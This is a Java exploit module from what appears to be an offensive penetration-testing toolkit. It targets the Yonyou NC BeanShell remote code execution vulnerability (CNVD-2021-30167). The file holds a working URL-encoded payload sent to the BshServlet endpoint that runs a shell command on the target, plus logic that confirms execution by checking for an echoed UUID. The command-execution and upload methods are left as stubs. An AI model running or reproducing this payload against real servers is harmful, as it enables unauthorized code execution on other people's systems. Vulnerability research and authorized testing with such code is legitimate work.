package fun.fireline.exp.cms.nc;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/7/5 20:03
 * @github https://github.com/yhy0
 */
// 用友NC BeanShell 远程代码执行漏洞
public class CNVD_2021_30167 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/servlet/~ic/bsh.servlet.BshServlet";
    private static final String PAYLOAD = "bsh.script=exec%28%22%s%22%29%3B%0D%0A";


    @Override
    public String checkVul(String url) {

        String uuid =  UUID.randomUUID().toString();

        this.target = url + VULURL;

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        String data = String.format(PAYLOAD, "echo " + uuid);
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");
        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        return null;
    }

    @Override
    public String getWebPath() {
        return null;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
